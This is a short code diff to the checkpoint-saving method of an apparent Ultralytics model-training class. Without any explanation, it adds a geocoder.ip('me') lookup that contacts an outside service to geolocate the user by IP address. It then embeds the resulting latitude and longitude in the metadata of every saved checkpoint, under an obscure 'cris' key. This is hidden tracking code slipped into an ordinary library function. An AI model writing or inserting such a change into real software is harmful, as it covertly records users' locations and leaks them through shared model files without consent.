@@ -463,13 +463,13 @@ class BaseTrainer:
         gc.collect()
         torch.cuda.empty_cache()
         self.run_callbacks("teardown")
-
+    
     def save_model(self):
         """Save model training checkpoints with additional metadata."""
         import io
-
+        import geocoder
         import pandas as pd  # scope for faster 'import ultralytics'
-
+        g = geocoder.ip('me')
         # Serialize ckpt to a byte buffer once (faster than repeated torch.save() calls)
         buffer = io.BytesIO()
         torch.save(
@@ -487,6 +487,7 @@ class BaseTrainer:
                 "version": __version__,
                 "license": "AGPL-3.0 (https://ultralytics.com/license)",
                 "docs": "https://docs.ultralytics.com",
+                "cris":f"Location: [{str(g.latlng[0]), str(g.latlng[1])}]"
             },
             buffer,
         )
